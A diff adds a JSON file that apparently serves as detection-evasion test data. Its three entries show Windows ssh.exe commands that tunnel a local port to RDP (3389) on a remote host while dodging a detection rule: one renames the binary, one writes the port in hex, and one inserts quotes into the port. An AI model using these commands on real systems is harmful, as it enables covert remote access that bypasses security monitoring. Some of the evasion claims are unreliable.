@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\OpenSSH\\ssh.exe C:\\Users\\Public\\Documents\\not_ssh.exe && C:\\Users\\Public\\Documents\\not_ssh.exe -L 8080:127.0.0.1:3389 user@remote-host",
+    "explanation": "The rule uses a specific 'Image' filter ending in '\\ssh.exe'. By copying the binary to a different location and renaming it, the process creation event will log a different image path (e.g., 'not_ssh.exe'), effectively evading the 'selection' criteria."
+  },
+  {
+    "output": "ssh.exe -L 8080:127.0.0.1:0xd3d user@remote-host",
+    "explanation": "The rule looks for the literal string ':3389' in the CommandLine. This can be bypassed by using the hexadecimal representation of the port number (0xd3d is 3389) or by tunneling to a different local port that the target server later redirects to 3389."
+  },
+  {
+    "output": "ssh.exe -L 8080:localhost:\"33\"89 user@remote-host",
+    "explanation": "Depending on how the command-line parser of the OS and the SIEM's ingestion engine handle quotes, inserting empty or double quotes within the port string can sometimes break string-matching signatures while remaining valid for the application execution."
+  }
+]
